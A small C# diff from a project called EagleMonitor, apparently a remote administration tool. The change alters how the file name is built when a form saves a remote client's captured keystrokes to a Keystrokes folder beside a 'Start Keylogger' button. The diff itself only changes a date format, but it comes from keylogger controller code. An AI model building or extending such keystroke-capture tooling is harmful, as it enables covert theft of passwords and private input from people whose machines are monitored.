@@ -58,7 +58,7 @@ namespace EagleMonitor.Forms
             }
 
             Directory.CreateDirectory(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\");
-            File.WriteAllText(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\" + "keystrokes" + DateTime.Now.ToString().Replace(":", "") + ".txt", keystrokeRichTextBox.Text);
+            File.WriteAllText(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\Keystrokes\\"  + Utils.Miscellaneous.DateFormater() + ".txt", keystrokeRichTextBox.Text);
             hasAlreadyConnected = false;
             this.startKeylogGuna2Button.Enabled = true;
             this.startKeylogGuna2Button.Text = "Start Keylogger";
